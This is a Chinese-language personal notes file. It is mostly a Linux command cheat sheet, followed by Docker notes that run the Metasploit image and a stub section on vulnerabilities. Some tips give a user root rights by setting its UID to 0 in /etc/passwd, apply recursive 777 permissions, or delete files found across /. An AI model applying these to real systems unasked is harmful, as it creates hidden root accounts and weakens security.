- `firefox&`，最后后面的 **&** 符号，表示使用后台方式打开 Firefox，然后显示该进程的 PID 值

- `jobs`，查看后台运行的程序列表

- `ifconfig`，查看内网 IP 等信息（常用）

- `curl ifconfig.me`，查看外网 IP 信息

- `curl ip.cn`，查看外网 IP 信息

- ```
  locate 搜索关键字
  ```

  ，快速搜索系统文件/文件夹（类似 Windows 上的 everything 索引式搜索）（常用）

  - `updatedb`，配合上面的 locate，给 locate 的索引更新（locate 默认是一天更新一次索引）（常用）

- ```
  date
  ```

  ，查看系统时间（常用）

  - `date -s20080103`，设置日期（常用）
  - `date -s18:24`，设置时间，如果要同时更改 BIOS 时间，再执行 `hwclock --systohc`（常用）

- `cal`，在终端中查看日历，肯定没有农历显示的

- `uptime`，查看系统已经运行了多久，当前有几个用户等信息（常用）

- `cat 文件路名`，显示文件内容（属于打印语句）

- `cat -n 文件名`，显示文件，并每一行内容都编号

- `more 文件名`，用分页的方式查看文件内容（按 space 翻下一页，按 *Ctrl + B* 返回上页）

- ```
  less
  ```

  文件名，用分页的方式查看文件内容（带上下翻页）

  - 按 **j** 向下移动，按 **k** 向上移动
  - 按 **/** 后，输入要查找的字符串内容，可以对文件进行向下查询，如果存在多个结果可以按 **n** 调到下一个结果出
  - 按 **？** 后，输入要查找的字符串内容，可以对文件进行向上查询，如果存在多个结果可以按 **n** 调到下一个结果出

- ```
  shutdown
  ```

  - `shutdown -hnow`，立即关机
  - `shutdown -h+10`，10 分钟后关机
  - `shutdown -h23:30`，23:30 关机
  - `shutdown -rnew`，立即重启

- `poweroff`，立即关机（常用）

- `reboot`，立即重启（常用）

- ```
  zip mytest.zip /opt/test/
  ```

  ，把 /opt 目录下的 test/ 目录进行压缩，压缩成一个名叫 mytest 的 zip 文件

  - `unzip mytest.zip`，对 mytest.zip 这个文件进行解压，解压到当前所在目录
  - `unzip mytest.zip -d /opt/setups/`，对 mytest.zip 这个文件进行解压，解压到 /opt/setups/ 目录下

- `tar -cvf mytest.tar mytest/`，对 mytest/ 目录进行归档处理（归档和压缩不一样）

- ```
  tar -xvf mytest.tar
  ```

  ，释放 mytest.tar 这个归档文件，释放到当前目录

  - `tar -xvf mytest.tar -C /opt/setups/`，释放 mytest.tar 这个归档文件，释放到 /opt/setups/ 目录下

- `last`，显示最近登录的帐户及时间

- `lastlog`，显示系统所有用户各自在最近登录的记录，如果没有登录过的用户会显示 **从未登陆过**

- ```
  ls
  ```

  ，列出当前目录下的所有没有隐藏的文件 / 文件夹。

  - `ls -a`，列出包括以.号开头的隐藏文件 / 文件夹（也就是所有文件）
  - `ls -R`，显示出目录下以及其所有子目录的文件 / 文件夹（递归地方式，不显示隐藏的文件）
  - `ls -a -R`，显示出目录下以及其所有子目录的文件 / 文件夹（递归地方式，显示隐藏的文件）
  - `ls -al`，列出目录下所有文件（包含隐藏）的权限、所有者、文件大小、修改时间及名称（也就是显示详细信息）
  - `ls -ld 目录名`，显示该目录的基本信息
  - `ls -t`，依照文件最后修改时间的顺序列出文件名。
  - `ls -F`，列出当前目录下的文件名及其类型。以 **/** 结尾表示为目录名，以 ***** 结尾表示为可执行文件，以 **@** 结尾表示为符号连接
  - `ls -lg`，同上，并显示出文件的所有者工作组名。
  - `ls -lh`，查看文件夹类文件详细信息，文件大小，文件修改时间
  - `ls /opt | head -5`，显示 opt 目录下前 5 条记录
  - `ls -l | grep '.jar'`，查找当前目录下所有 jar 文件
  - `ls -l /opt |grep "^-"|wc -l`，统计 opt 目录下文件的个数，不会递归统计
  - `ls -lR /opt |grep "^-"|wc -l`，统计 opt 目录下文件的个数，会递归统计
  - `ls -l /opt |grep "^d"|wc -l`，统计 opt 目录下目录的个数，不会递归统计
  - `ls -lR /opt |grep "^d"|wc -l`，统计 opt 目录下目录的个数，会递归统计
  - `ls -lR /opt |grep "js"|wc -l`，统计 opt 目录下 js 文件的个数，会递归统计
  - `ls -l`，列出目录下所有文件的权限、所有者、文件大小、修改时间及名称（也就是显示详细信息，不显示隐藏文件）。显示出来的效果如下：

```
-rwxr-xr-x. 1 root root 4096 3月 26 10:57，其中最前面的 - 表示这是一个普通文件
lrwxrwxrwx. 1 root root 4096 3月 26 10:57，其中最前面的 l 表示这是一个链接文件，类似 Windows 的快捷方式
drwxr-xr-x. 5 root root 4096 3月 26 10:57，其中最前面的 d 表示这是一个目录
```

- ```
  cd
  ```

  ，目录切换

  - `cd ..`，改变目录位置至当前目录的父目录(上级目录)。
  - `cd ~`，改变目录位置至用户登录时的工作目录。
  - `cd 回车`，回到家目录
  - `cd -`，上一个工作目录
  - `cd dir1/`，改变目录位置至 dir1 目录下。
  - `cd ~user`，改变目录位置至用户的工作目录。
  - `cd ../user`，改变目录位置至相对路径user的目录下。
  - `cd /../..`，改变目录位置至绝对路径的目录位置下。

- ```
  cp 源文件 目标文件
  ```

  ，复制文件

  - `cp -r 源文件夹 目标文件夹`，复制文件夹
  - `cp -r -v 源文件夹 目标文件夹`，复制文件夹(显示详细信息，一般用于文件夹很大，需要查看复制进度的时候)
  - `cp /usr/share/easy-rsa/2.0/keys/{ca.crt,server.{crt,key},dh2048.pem,ta.key} /etc/openvpn/keys/`，复制同目录下花括号中的文件

- `tar cpf - . | tar xpf - -C /opt`，复制当前所有文件到 /opt 目录下，一般如果文件夹文件多的情况下用这个更好，用 cp 比较容易出问题

- ```
  mv 文件 目标文件夹
  ```

  ，移动文件到目标文件夹

  - `mv 文件`，不指定目录重命名后的名字，用来重命名文件

- `touch 文件名`，创建一个空白文件/更新已有文件的时间(后者少用)

- `mkdir 文件夹名`，创建文件夹

- `mkdir -p /opt/setups/nginx/conf/`，创建一个名为 conf 文件夹，如果它的上级目录 nginx 没有也会跟着一起生成，如果有则跳过

- `rmdir 文件夹名`，删除文件夹(只能删除文件夹里面是没有东西的文件夹)

- ```
  rm 文件
  ```

  ，删除文件

  - `rm -r 文件夹`，删除文件夹
  - `rm -r -i 文件夹`，在删除文件夹里的文件会提示(要的话,在提示后面输入yes)
  - `rm -r -f 文件夹`，强制删除
  - `rm -r -f 文件夹1/ 文件夹2/ 文件夹3/`删除多个

- ```
  find
  ```

  ，高级查找

  - `find . -name *lin*`，其中 . 代表在当前目录找，-name 表示匹配文件名 / 文件夹名，*lin* 用通配符搜索含有lin的文件或是文件夹
  - `find . -iname *lin*`，其中 . 代表在当前目录找，-iname 表示匹配文件名 / 文件夹名（忽略大小写差异），*lin* 用通配符搜索含有lin的文件或是文件夹
  - `find / -name *.conf`，其中 / 代表根目录查找，*.conf代表搜索后缀会.conf的文件
  - `find /opt -name .oh-my-zsh`，其中 /opt 代表目录名，.oh-my-zsh 代表搜索的是隐藏文件 / 文件夹名字为 oh-my-zsh 的
  - `find /opt -type f -iname .oh-my-zsh`，其中 /opt 代表目录名，-type f 代表只找文件，.oh-my-zsh 代表搜索的是隐藏文件名字为 oh-my-zsh 的
  - `find /opt -type d -iname .oh-my-zsh`，其中 /opt 代表目录名，-type d 代表只找目录，.oh-my-zsh 代表搜索的是隐藏文件夹名字为 oh-my-zsh 的
  - `find . -name "lin*" -exec ls -l {} \;`，当前目录搜索lin开头的文件，然后用其搜索后的结果集，再执行ls -l的命令（这个命令可变，其他命令也可以），其中 -exec 和 {} ; 都是固定格式
  - `find /opt -type f -size +800M -print0 | xargs -0 du -h | sort -nr`，找出 /opt 目录下大于 800 M 的文件
  - `find / -name "*tower*" -exec rm {} \;`，找到文件并删除
  - `find / -name "*tower*" -exec mv {} /opt \;`，找到文件并移到 opt 目录
  - `find . -name "*" |xargs grep "youmeek"`，递归查找当前文件夹下所有文件内容中包含 youmeek 的文件
  - `find . -size 0 | xargs rm -f &`，删除当前目录下文件大小为0的文件
  - `du -hm --max-depth=2 | sort -nr | head -12`，找出系统中占用容量最大的前 12 个目录

- `cat /etc/resolv.conf`，查看 DNS 设置

- `netstat -tlunp`，查看当前运行的服务，同时可以查看到：运行的程序已使用端口情况

- `env`，查看所有系统变量

- `export`，查看所有系统变量

- ```
  echo
  ```

  - `echo $JAVA_HOME`，查看指定系统变量的值，这里查看的是自己配置的 JAVA_HOME。
  - `echo "字符串内容"`，输出 "字符串内容"
  - `echo > aa.txt`，清空 aa.txt 文件内容（类似的还有：`: > aa.txt`，其中 : 是一个占位符, 不产生任何输出）

- `unset $JAVA_HOME`，删除指定的环境变量

- `ln -s /opt/data /opt/logs/data`，表示给 /opt/logs 目录下创建一个名为 data 的软链接，该软链接指向到 /opt/data

- ```
  grep
  ```

  - `shell grep -H '安装' *.sh`，查找当前目录下所有 sh 类型文件中，文件内容包含 `安装` 的当前行内容
  - `grep 'test' java*`，显示当前目录下所有以 java 开头的文件中包含 test 的行
  - `grep 'test' spring.ini docker.sh`，显示当前目录下 spring.ini docker.sh 两个文件中匹配 test 的行

- ```
  ps
  ```

  - `ps –ef|grep java`，查看当前系统中有关 java 的所有进程
  - `ps -ef|grep --color java`，高亮显示当前系统中有关 java 的所有进程

- ```
  kill
  ```

  - `kill 1234`，结束 pid 为 1234 的进程
  - `kill -9 1234`，强制结束 pid 为 1234 的进程（慎重）
  - `killall java`，结束同一进程组内的所有为 java 进程
  - `ps -ef|grep hadoop|grep -v grep|cut -c 9-15|xargs kill -9`，结束包含关键字 hadoop 的所有进程

- ```
  head
  ```

  - `head -n 10 spring.ini`，查看当前文件的前 10 行内容

- ```
  tail
  ```

  - `tail -n 10 spring.ini`，查看当前文件的后 10 行内容
  - `tail -200f 文件名`，查看文件被更新的新内容尾 200 行，如果文件还有在新增可以动态查看到（一般用于查看日记文件）

## 用户、权限-相关命令

- 使用 pem 证书登录：

  ```
  ssh -i /opt/mykey.pem root@192.168.0.70
  ```

  - 证书权限不能太大，不然无法使用：`chmod 600 mykey.pem`

- `hostname`，查看当前登陆用户全名

- `cat /etc/group`，查看所有组

- `cat /etc/passwd`，查看所有用户

- `groups youmeek`，查看 youmeek 用户属于哪个组

- `useradd youmeek -g judasn`，添加用户并绑定到 judasn 组下

- ```
  userdel -r youmeek
  ```

  ，删除名字为 youmeek 的用户

  - 参数：`-r`，表示删除用户的时候连同用户的家目录一起删除

- 修改普通用户 youmeek 的权限跟 root 权限一样：

  - 常用方法（原理是把该用户加到可以直接使用 sudo 的一个权限状态而已）：

    - 编辑配置文件：`vim /etc/sudoers`
    - 找到 98 行（预估），有一个：`root ALL=(ALL) ALL`，在这一行下面再增加一行，效果如下：

    ```
     root    ALL=(ALL)   ALL
     youmeek    ALL=(ALL)   ALL
    ```

  - 另一种方法：

    - 编辑系统用户的配置文件：`vim /etc/passwd`，找到 **root** 和 **youmeek** 各自开头的那一行，比如 root 是：`root:x:0:0:root:/root:/bin/zsh`，这个代表的含义为：*用户名:密码:UserId:GroupId:描述:家目录:登录使用的 shell*
    - 通过这两行对比，我们可以直接修改 youmeek 所在行的 UserId 值 和 GroupId 值，都改为 0。

- `groupadd judasn`，添加一个名为 judasn 的用户组

- `groupdel judasn`，删除一个名为 judasn 的用户组（前提：先删除组下面的所有用户）

- `usermod 用户名 -g 组名`，把用户修改到其他组下

- `passwd youmeek`，修改 youmeek 用户的密码（前提：只有 root 用户才有修改其他用户的权限，其他用户只能修改自己的）

- ```
  chmod 777 文件名/目录
  ```

  ，给指定文件增加最高权限，系统中的所有人都可以进行读写。

  - linux 的权限分为 rwx。r 代表：可读，w 代表：可写，x 代表：可执行
  - 这三个权限都可以转换成数值表示，r = 4，w = 2，x = 1，- = 0，所以总和是 7，也就是最大权限。第一个 7 是所属主（user）的权限，第二个 7 是所属组（group）的权限，最后一位 7 是非本群组用户（others）的权限。
  - `chmod -R 777 目录` 表示递归目录下的所有文件夹，都赋予 777 权限
  - `chown myUsername:myGroupName myFile` 表示修改文件所属用户、组
  - `chown -R myUsername:myGroupName myFolder` 表示递归修改指定目录下的所有文件权限

- ```
  su
  ```

  ：切换到 root 用户，终端目录还是原来的地方（常用）

  - `su -`：切换到 root 用户，其中 **-** 号另起一个终端并切换账号
  - `su 用户名`，切换指定用户帐号登陆，终端目录还是原来地方。
  - `su - 用户名`，切换到指定用户帐号登陆，其中 **-** 号另起一个终端并切换账号

- `exit`，注销当前用户（常用）

- `sudo 某个命令`，使用管理员权限使用命令，使用 sudo 回车之后需要输入当前登录账号的密码。（常用）

- `passwd`，修改当前用户密码（常用）

- 添加临时账号，并指定用户根目录，并只有可读权限方法

  - 添加账号并指定根目录（用户名 tempuser）：`useradd -d /data/logs -m tempuser`
  - 设置密码：`passwd tempuser` 回车设置密码
  - 删除用户（该用户必须退出 SSH 才能删除成功），也会同时删除组：`userdel tempuser`

## 磁盘管理

- ```
  df -h
  ```

  ，自动以合适的磁盘容量单位查看磁盘大小和使用空间

  - `df -k`，以磁盘容量单位 K 为数值结果查看磁盘使用情况
  - `df -m`，以磁盘容量单位 M 为数值结果查看磁盘使用情况

- `du -sh /opt`，查看 opt 这个文件夹大小 （h 的意思 human-readable 用人类可读性较好方式显示，系统会自动调节单位，显示合适大小的单位）

- `du -sh ./*`，查看当前目录下所有文件夹大小 （h 的意思 human-readable 用人类可读性较好方式显示，系统会自动调节单位，显示合适大小的单位）

- `du -sh /opt/setups/`，显示 /opt/setups/ 目录所占硬盘空间大小（s 表示 –summarize 仅显示总计，即当前目录的大小。h 表示 –human-readable 以 KB，MB，GB 为单位，提高信息的可读性）

- ```
  mount /dev/sdb5 /newDir/
  ```

  ，把分区 sdb5 挂载在根目录下的一个名为 newDir 的空目录下，需要注意的是：这个目录最好为空，不然已有的那些文件将看不到，除非卸载挂载。

  - 挂载好之后，通过：`df -h`，查看挂载情况。

- ```
  umount /newDir/
  ```

  ，卸载挂载，用目录名

  - 如果这样卸载不了可以使用：`umount -l /newDir/`

- `umount /dev/sdb5`，卸载挂载，用分区名

## wget 下载文件

- 常规下载：`wget http://www.gitnavi.com/index.html`
- 自动断点下载：`wget -c http://www.gitnavi.com/index.html`
- 后台下载：`wget -b http://www.gitnavi.com/index.html`
- 伪装代理名称下载：`wget --user-agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" http://www.gitnavi.com/index.html`
- 限速下载：`wget --limit-rate=300k http://www.gitnavi.com/index.html`
- 批量下载：`wget -i /opt/download.txt`，一个下载地址一行
- 后台批量下载：`wget -b -c -i /opt/download.txt`，一个下载地址一行

## 其他常用命令

- 编辑 hosts 文件：`vim /etc/hosts`，添加内容格式：`127.0.0.1 www.youmeek.com`
- RPM 文件操作命令：
  - 安装
    - `rpm -i example.rpm`，安装 example.rpm 包
    - `rpm -iv example.rpm`，安装 example.rpm 包并在安装过程中显示正在安装的文件信息
    - `rpm -ivh example.rpm`，安装 example.rpm 包并在安装过程中显示正在安装的文件信息及安装进度
  - 查询
    - `rpm -qa | grep jdk`，查看 jdk 是否被安装
    - `rpm -ql jdk`，查看 jdk 是否被安装
  - 卸载
    - `rpm -e jdk`，卸载 jdk（一般卸载的时候都要先用 rpm -qa 看下整个软件的全名）
- YUM 软件管理：
  - `yum install -y httpd`，安装 apache
  - `yum remove -y httpd`，卸载 apache
  - `yum info -y httpd`，查看 apache 版本信息
  - `yum list --showduplicates httpd`，查看可以安装的版本
  - `yum install httpd-查询到的版本号`，安装指定版本
  - 更多命令可以看：http://man.linuxde.net/yum
- 查看某个配置文件，排除掉里面以 # 开头的注释内容：
  - `grep '^[^#]' /etc/openvpn/server.conf`
- 查看某个配置文件，排除掉里面以 # 开头和 ; 开头的注释内容：
  - `grep '^[^#;]' /etc/openvpn/server.conf`

## AWK命令

`awk '{ print }' /etc/passwd`

查看/etc/passwd内容和用cat命令一样.指定了/etc/passwd 作为输入文件。执行 awk 时，它依次对 /etc/passwd 中的每一行执行 print 命令

`awk '{ print $0 }' /etc/passwd`

在 awk 中， $0 变量表示整个当前行，所以 print 和 print $0 的作用完全一样.

`awk -F":" '{ print $1 }' /etc/passwd`

使用 -F 选项来指定 ":" 作为字段分隔符。awk 处理 print $1 命令时，它会打印出在输入文件中每一行中出现的第一个字段(第一列)。

`awk -F":" '{ print $1 $3 }' /etc/passwd`

打印第一列和第三列

`awk -F":" '{ print $1 " " $3 }' /etc/passwd`

打印第一列和第三列,用空格分开

awk -F":" '{ print "username: " $1 "/t/tuid:" $3" }' /etc/passwd

拼接一些字符串



待更新



# docker命令笔记

搜索镜像

```
sudo docker search metasploit
```

拉取(下载)镜像

```
sudo docker pull metasploitframework/metasploit-framework
```

查看全部镜像

```
sudo docker images
```

简单运行镜像

```
sudo docker run metasploitframework/metasploit-framework
```

用id运行 

```
sudo docker run 644b96152120
```

交互运行镜像

```
sudo docker run -dit --name msf metasploitframework/metasploit-framework
```

-dit 同等于 -d -i -t
-i: 以交互模式运行容器，通常与 -t 同时使用；
-d: 后台运行容器，并返回容器ID；
-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；
--name="msf": 为容器指定一个名称，方面后面直接用名称启动；

进入容器终端(进入已经在运行的镜像)

```
sudo docker exec -it msf /bin/bash
```

端口映射，运行镜像(容器80到主机5000)

```
sudo docker run -dit -p 5000:80 --name nginx nginx:latest
```

查看容器的端口映射

```
sudo docker port nginx
```

启动容器(运行过镜像就会出现一个容器,比如电脑重启就需要重新启动容器,不需要在重新run一个)

```
sudo docker start nginx
```

停止容器

```
sudo docker stop nginx
```

重启容器

```
sudo docker restart nginx
```

查看当前正在运行的容器

```
sudo docker ps
```

查看全部，包括已经停止的

```
docker ps -a
```

删除容器

```
sudo docker rm 容器id
```

强制删除

```
sudo docker rm -f 容器id
```

删除镜像

```
sudo docker rmi 镜像id
```

查看网络

```
sudo docker network ls
```





# ubuntu踩坑记录

- unzip 命令解压windows下的压缩包乱码,可用unar命令解决

  ```bash 
  sudo apt install unar
  unar xxx.zip            #不需要加参数，自动识别编码
  ```

- 



# 编程语言学习笔记

## php



# 读书笔记



# 漏洞笔记

xss入门https://wizardforcel.gitbooks.io/xss-naxienian/content/1.html
